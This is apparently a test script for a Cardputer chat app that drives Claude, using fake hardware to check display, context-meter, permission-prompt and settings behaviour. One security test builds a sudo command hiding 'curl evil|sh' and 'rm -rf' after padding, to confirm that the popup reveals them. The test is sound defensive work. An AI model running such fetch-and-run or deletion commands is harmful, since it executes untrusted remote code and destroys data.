"""Off-device-safe test of the chat GUI with a fake screen, keyboard and Claude.
Run on the Cardputer (it has the fonts):  python3 tools/test_chat.py OUTDIR [SRC_DIR]
Checks hide / park / wake, the context meter + /compact, the chime and both chat styles,
and saves screenshots to OUTDIR. Touches nothing real: no framebuffer, keyboard, sudo or network."""
import os
import sys
import time

OUT = sys.argv[1]
sys.path.insert(0, sys.argv[2] if len(sys.argv) > 2 else "/usr/share/clawputer")
os.makedirs(OUT, exist_ok=True)
os.environ.update(CLAWPUTER_CHECKED="1", CLAWPUTER_HIDE="1")
import clawputer_gui as g  # noqa: E402

shots = []
chimes = []


class FB:
    prev = None
    def write(self, img): shots.append(img.copy())
    def close(self, blank=True): pass
    def save_raw(self, path): pass


class KB:
    fd = -1
    def read(self): return []
    def close(self): pass


class FakeClaude:
    started = 0
    def __init__(self, *a, resume=None, **k):
        FakeClaude.started += 1
        self.resume, self.open, self.said = resume, True, []
    def alive(self): return self.open
    def say(self, t): self.said.append(t); return FakeClaude.ok
    def interrupt(self): return True
    answers = []
    ok = True
    def answer(self, *a): FakeClaude.answers.append(a)
    def close(self): self.open = False
    def fileno(self): return -1


class FakeNet:
    online, changed = True, False


g.Framebuffer, g.Keyboard, g.ClaudeSession = FB, KB, FakeClaude
g.NetCheck = FakeNet
g.list_chats = lambda: []
g.install_claude_md = lambda: None
g.play_chime = lambda kind="done": chimes.append(time.time()) if kind == "done" else None
g.save_settings = lambda cfg: None
g.load_settings = lambda: dict(g.DEFAULTS)          # never your real settings (e.g. web ui on)
g.App.open_askpass = lambda self: None
g.App.set_state = lambda self, st: None
g.App.save_draft = lambda self: None
g.mem_free_mb = lambda: 300
g.net_kind = lambda: "wifi"
g.battery = lambda: (76, False)

fails = []


def check(cond, what):
    print(("ok   " if cond else "FAIL ") + what)
    if not cond:
        fails.append(what)


def save(a, name):
    a.dirty = True
    a.draw()
    shots[-1].save(os.path.join(OUT, name))


a = g.App([])
a.cfg.update(style="plain", chime="on", font="10")
a.set_font(10)
init = {"type": "system", "subtype": "init", "session_id": "s1", "model": "claude-opus-5-5"}
a.handle(init)
check(a.model == "opus 5.5", "model badge name: %r" % a.model)
check(a.status == "ready", "status no longer repeats the model")

a.entries.clear()
a.add("user", "what's on the i2c bus? and is the lora cap on?")
a.handle({"type": "assistant", "message": {"content": [
    {"type": "text", "text": "## I2C scan\nFound **2 devices**:\n- `0x43` the LoRa cap's IO expander\n"
     "- `0x55` the battery gauge\n\nThe cap's 5V is **on**, so it's ready to use."}],
    "usage": {"input_tokens": 3, "cache_read_input_tokens": 52000, "cache_creation_input_tokens": 1200,
              "output_tokens": 300}}})
a.handle({"type": "result", "subtype": "success", "modelUsage": {"claude-opus-5-5": {"contextWindow": 200000}}})
check(a.ctx_used == 53503, "context tokens from usage: %r" % a.ctx_used)
check(abs(a.ctx_frac() - 53503 / 200000) < 1e-6, "context fraction")
save(a, "1-plain.png")
a.cfg["style"] = "bubbles"
a.lines_cache = None
save(a, "2-bubbles.png")
check(any(isinstance(t, list) for _, t, _ in a.all_lines()), "bubbles: markdown runs")
check(any(isinstance(p, tuple) for _, _, p in a.all_lines()), "bubbles: user bubble rows")

# context warning + /compact
a.handle({"type": "assistant", "message": {"content": [], "usage": {"input_tokens": 170000}}})
a.handle({"type": "result", "subtype": "success"})
check(a.ctx_warned and "context 85% full" in a.entries[-1][1], "warns at 80%")
save(a, "3-ctx-high.png")
a.handle({"type": "system", "subtype": "compact_boundary", "compact_metadata": {"pre_tokens": 170000}})
check(a.ctx_used is None and not a.ctx_warned, "compact without a size: meter blank until the next reply")
a.handle({"type": "system", "subtype": "compact_boundary",
          "compact_metadata": {"trigger": "manual", "pre_tokens": 170000, "post_tokens": 7002}})
check(a.ctx_used == 7002, "compact with post_tokens: meter drops straight away")
check("compacted" in a.entries[-1][1], "compact shows a line")
a.handle({"type": "assistant", "message": {"content": [], "usage": {"input_tokens": 9000}}})
check(a.ctx_used == 9000, "meter picks up again after compact")

# busy status + offline
a.busy, a.t_start = True, time.time() - 12
a.turn = {"phase": "thinking", "done": 0, "chars": 0, "msg": 0}
save(a, "4-busy.png")
a.busy, a.turn = False, None
a.net.online = False
save(a, "5-offline.png")
a.net.online = True
g.net_kind = lambda: "tether"
g.battery = lambda: (12, True)
save(a, "6-tether-lowbatt.png")

# chime only while minimised
n = len(chimes)
a.handle({"type": "result", "subtype": "success"})
check(len(chimes) == n, "no chime while on screen")
a.busy = True
a.hide()
check(a.hidden and a.kb is None, "ctrl+h / hide lets go of the keyboard")
a.handle({"type": "result", "subtype": "success"})
check(len(chimes) == n + 1 and a.unseen, "chime + unseen when claude finishes while hidden")
a.hidden_tick = a.hidden_tick                    # idle while hidden -> claude parked
before = FakeClaude.started
g.select.select = lambda r, w, x, t=None: ([], [], [])
a.hidden_tick()
check(a.parked and not a.claude.alive(), "idle + hidden: claude stopped to save RAM")
a.want_show = True
a.scroll = 5
a.hidden_tick()
check(not a.hidden and not a.parked, "wake: shown again")
check(FakeClaude.started == before + 1 and a.claude.resume == "s1", "wake: claude resumed the same chat")
check(a.scroll == 0, "wake: jumps to the newest reply")

# memory watchdog while busy and hidden
a.busy = True
a.hide()
g.mem_free_mb = lambda: 30
a.hidden_tick()
check(a.parked, "low memory while hidden: claude stopped even mid-reply")
g.mem_free_mb = lambda: 300

a.show()
a.show_help()
save(a, "7-help.png")
a.overlay = None
check(any(l.startswith("/new") for l in a.show_help() or a.overlay[1]), "help: /new on its own line")
a.overlay = None

# tool output: kept whole (the web ui can unfold it), trimmed only on the cardputer screen
a.entries.clear()
a.cfg["tool_lines"] = "3"
a.ingest({"type": "user", "message": {"content": [
    {"type": "tool_result", "content": "\n".join("line %d" % i for i in range(10))}]}})
check(a.entries[-1][1].count("\n") == 9, "full tool output kept for the web ui")
a.lines_cache = None
rows = [t for k, t, p in a.all_lines() if k == "result" and p == "mid"]
check(rows[:3] == ["line 0", "line 1", "line 2"] and rows[3:] == ["… +7 lines"],
      "cardputer shows 3 lines + '… +7 lines': %r" % rows)


# ---- 0.5.0 review fixes ----
import subprocess as _sp
a.cfg["style"] = "plain"
a.entries.clear(); a.queue.clear(); a.input = ""; a.busy = False; a.pending = None; a.ask = None
a.scroll = 0
# 1. typing straight into a permission prompt doesn't answer it
FakeClaude.answers.clear()
a.input = "any idea"
a.handle({"type": "control_request", "request_id": "r1",
          "request": {"subtype": "can_use_tool", "tool_name": "Bash", "input": {"command": "ls /"}}})
a.key("a")
check(a.pending is not None and not FakeClaude.answers and "Bash" not in a.always,
      "a keypress right as the prompt appears is ignored")
# 4. scrolling works during a prompt, j jumps back, the prompt floats while scrolled up
for i in range(40):
    a.add("assistant", "line %d" % i)
a.key("up"); a.key("up")
check(a.scroll == 2 and a.pending is not None, "scroll keys work while a prompt waits")
save(a, "8-prompt-scrolled.png")
a.key("j")
check(a.scroll == 0 and a.pending is not None, "j jumps to the bottom and keeps the prompt")
a.prompt_t -= 1
a.key("n")
check(a.pending is None and FakeClaude.answers and FakeClaude.answers[-1][1] is False, "n denies after the grace period")
check(a.input == "any idea", "your half-typed message is untouched")
# 1b. questions keep your draft
a.input = "half typed"
a.handle({"type": "control_request", "request_id": "q1", "request": {"subtype": "can_use_tool",
          "tool_name": "AskUserQuestion", "input": {"questions": [{"question": "colour?", "options": [{"label": "red"}]}]}}})
a.key("t")
check(not a.ask["typing"], "'t' right as a question appears is ignored")
a.prompt_t -= 1
a.key("t")
check(a.ask["typing"] and a.input == "", "'t' then switches to typing an answer")
a.input = "blue"
a.submit()
check(a.ask is None and a.input == "half typed", "after answering, your draft comes back")
# 3. enter on an empty box restarts a dead claude; a failed send keeps your text
a.claude.open = False
n0 = FakeClaude.started
a.input = ""
a.submit()
check(FakeClaude.started == n0 + 1 and a.claude.alive(), "enter on an empty box restarts claude")
FakeClaude.ok = False
a.input = "hello"
a.submit()
check(a.input == "hello" and "couldn't reach" in a.entries[-1][1], "failed send puts the text back")
FakeClaude.ok = True
a.input = ""
# 2. stopping doesn't fire the queue; esc pulls the last one back
a.busy = True
a.queue[:] = ["one", "two"]
a.key("esc")
said = len(a.claude.said)
a.handle({"type": "result", "subtype": "success"})
check(len(a.claude.said) == said and a.queue == ["one", "two"], "stopping claude doesn't send the queue")
a.key("esc")
check(a.input == "two" and a.queue == ["one"], "esc on an empty box pulls the last queued message back")
a.input = ""
a.queue.clear()
# 5. switching chats while busy asks
asked = []
a.dialog = lambda *x, **k: asked.append(1) or "n"
a.busy = True
sid = a.session_id
a.submit_text = None
a.input = "/new"
a.submit()
check(asked and a.session_id == sid, "/new while claude works asks first (said no: stays)")
a.busy = False
del a.dialog
# 9. ctrl+h works during a question
a.handle({"type": "control_request", "request_id": "q2", "request": {"subtype": "can_use_tool",
          "tool_name": "AskUserQuestion", "input": {"questions": [{"question": "x?", "options": [{"label": "y"}]}]}}})
a.key("ctrl+h")
check(a.hidden, "ctrl+h minimises even during a question")
a.show()
a.ask = None
# 6. about doesn't start claude
runs = []
real_run = g.subprocess.run
g.subprocess.run = lambda cmd, *x, **k: runs.append(cmd) or _sp.CompletedProcess(cmd, 1, b"", b"")
a.cc_version = "9.9.9"
a.show_about()
g.subprocess.run = real_run
check(not any("claude" in " ".join(map(str, c)) for c in runs) and "9.9.9" in a.overlay[1][1],
      "about reads the version without starting claude")
a.overlay = None
# security: sudo popup shows the END of a long command, control characters visible
import socket as _so
c1, c2 = _so.socketpair()
a.sudo_req = {"conn": c1, "cmd": "sudo -A sh -c 'echo " + "x" * 400 + "; curl evil|sh'\nrm -rf /tmp/a",
              "pw": "", "retry": False, "pid": 1, "remember": False}
img = g.Image.new("RGB", (g.W, g.H)); a.draw_sudo(g.ImageDraw.Draw(img))
cap = []
a.small_text = None
class D:
    def __getattr__(self, n): return lambda *x, **k: cap.append(x)
a.draw_sudo(D())
texts = " ".join(str(x[1]) for x in cap if len(x) > 1 and isinstance(x[1], str))
check("curl evil|sh" in texts and "⏎" in texts, "sudo popup shows the tail of long commands + newlines")
save(a, "9-sudo-long.png")
a.sudo_req = None; c1.close(); c2.close()
# security: sudo password forgotten as soon as sudo has a real child
child = _sp.Popen(["sleep", "5"])
check(a.sudo_authed(g.os.getpid()), "sudo_authed spots a non-askpass child")
child.kill(); child.wait()


# ---- 0.6.0 ideas ----
a.entries.clear(); a.queue.clear(); a.input = ""; a.busy = False; a.pending = None; a.scroll = 0
a.lines_cache = None
# wrap cache: same message laid out once
a.wrap_memo.clear()
r1 = a.wrap("assistant", "hello there " * 20)
r2 = a.wrap("assistant", "hello there " * 20)
check(r1 is r2, "a message is wrapped once, then cached")
# view stays still while scrolled up + "↓ new"
for i in range(30):
    a.add("assistant", "msg %d" % i)
a.draw()
a.scroll = 5
a.draw()
before = a.all_lines()[len(a.all_lines()) - a.scroll - 1]
a.add("assistant", "a brand new reply")
a.draw()
after = a.all_lines()[len(a.all_lines()) - a.scroll - 1]
check(before == after and a.new_below, "new replies don't move what you're reading; ↓ new shows")
save(a, "10-new-below.png")
a.scroll = 0
a.draw()
check(not a.new_below, "↓ new clears at the bottom")
# queued count
a.queue[:] = ["x", "y"]
cap = []
class D:
    def __getattr__(self, n): return lambda *x, **k: cap.append(x)
a.draw_status(D())
check(any("2 queued" in str(x[1]) for x in cap if len(x) > 1), "status bar shows '2 queued'")
a.queue.clear()
# settings: descriptions, web state, switch target
a.open_menu()
a.menu = [x[0] for x in g.SETTINGS].index("permissions")
a.submenu = g.SETTINGS[a.menu][2].index("bypassPermissions")
cap.clear()
a.draw_menu(D())
check(any("⚠ runs everything" in str(x[1]) for x in cap if len(x) > 1), "bypassPermissions shows a warning")
a.draw()
shots[-1].save(os.path.join(OUT, "11-settings-help.png"))
a.submenu = None
a.menu = [x[0] for x in g.SETTINGS].index("@switch")
check(a.menu_value("@switch") == "→ pc" and a.menu_value("@web") == "off", "switch / web ui show their state")
a.draw()
shots[-1].save(os.path.join(OUT, "12-settings-switch.png"))
a.menu = None
# switch: writes the request for the launcher and quits (pc must be set up)
import tempfile
tmp = tempfile.mkdtemp()
real_conf = g.CONF
g.CONF = tmp
g.setup.remote_cfg = lambda: {"host": "pc", "user": "me"}
try:
    a.run_action("@switch")
    quit_ok = False
except SystemExit:
    quit_ok = True
check(quit_ok and open(os.path.join(tmp, "switch")).read() == "pc", "switch -> writes 'pc' for the launcher and quits")
g.CONF = real_conf


# ---- 0.7.0 ----
if os.environ.get("CZ_EMOJI_FONT"):
    g.EMOJI_FONT = os.environ["CZ_EMOJI_FONT"]
a.entries.clear(); a.queue.clear(); a.input = ""; a.busy = False; a.pending = None; a.ask = None; a.scroll = 0
a.cfg["style"] = "plain"; a.lines_cache = None; a.wrap_memo.clear()
# to-do list
a.handle({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "t1", "name": "TodoWrite", "input": {
    "todos": [{"content": "scan the i2c bus", "status": "completed", "activeForm": "scanning"},
              {"content": "check the lora cap", "status": "in_progress", "activeForm": "checking the lora cap"},
              {"content": "write it up", "status": "pending", "activeForm": "writing"}]}}]}})
a.handle({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "content": "Todos have been modified successfully"}]}})
kinds = [k for k, _ in a.entries]
check(kinds == ["todo"], "TodoWrite becomes a checklist (its 'modified' result hidden): %r" % kinds)
# tables + emoji
a.handle({"type": "assistant", "message": {"content": [{"type": "text", "text":
    "Done 🎉 here's the bus:\n\n| addr | device | ok |\n|---|---|---|\n| 0x43 | LoRa cap IO expander | ✅ |\n| 0x55 | battery gauge | ✅ |\n\nall good 👍"}]}})
rows = [(k, t) for k, t, p in a.all_lines()]
check(any(k == "tableh" and "addr" in t for k, t in rows) and any(k == "table" and "0x55" in t for k, t in rows),
      "markdown table drawn as a grid")
check(any(g.EMOJI_PAD in (t if isinstance(t, str) else "") for k, t in rows), "emoji get a 2-cell placeholder")
save(a, "13-todo-table-emoji.png")
# edit diff on a permission prompt
a.entries.clear(); a.lines_cache = None
a.handle({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "e1", "name": "Edit", "input": {
    "file_path": "/home/pi/clawputer/hello.py", "old_string": "print('hi')\nx = 1\n", "new_string": "print('hello world')\nx = 2\n"}}]}})
a.handle({"type": "control_request", "request_id": "p1", "request": {"subtype": "can_use_tool", "tool_name": "Edit",
          "input": {"file_path": "/home/pi/clawputer/hello.py"}}})
check([k for k, _ in a.entries] == ["tool", "diff", "ask"], "Edit shows a diff before the prompt")
d = dict(a.entries)["diff"]
check("-print('hi')" in d and "+print('hello world')" in d, "diff has the removed and added lines")
save(a, "14-edit-diff.png")
a.prompt_t -= 1; a.key("n")
# picture preview (claude made one with a command)
from PIL import Image as _I
pic = os.path.join(OUT, "plot.png")
im = _I.new("RGB", (300, 200), (30, 30, 60))
from PIL import ImageDraw as _D
dd = _D.Draw(im)
for i in range(0, 300, 6):
    dd.line((i, 190 - (i * i) // 600, i + 6, 190 - ((i + 6) ** 2) // 600), fill=(217, 119, 87), width=3)
im.save(pic)
a.entries.clear(); a.lines_cache = None; a.cwd = OUT
a.handle({"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "b1", "name": "Bash",
          "input": {"command": "python3 plot.py && echo saved plot.png"}}]}})
a.handle({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "b1", "content": "saved plot.png"}]}})
check(a.entries[-1] == ("image", pic), "a picture made by a command is shown afterwards")
a.add("assistant", "there's your plot")
save(a, "15-image.png")
# dim when idle, the waking key does nothing else
lvl = []
g.backlight_set = lambda v: lvl.append(v)
g.backlight_get = lambda: 80
a.cfg["dim"] = "1 min"; a.last_key = time.time() - 61; a.dimmed = False; a.bright = 80
a.dim_tick()
check(a.dimmed and lvl and lvl[-1] == 10, "dims after a minute idle (%r)" % lvl)
a.wake_screen()
check(not a.dimmed and lvl[-1] == 80, "any key brings the brightness back")
# setting descriptions exist for the new settings
check(all(k in g.SETTING_HELP for k in ("prompt_sound", "dim", "maxboost")), "new settings have descriptions")

print("\n%d failed" % len(fails) if fails else "\nall passed")
sys.exit(1 if fails else 0)
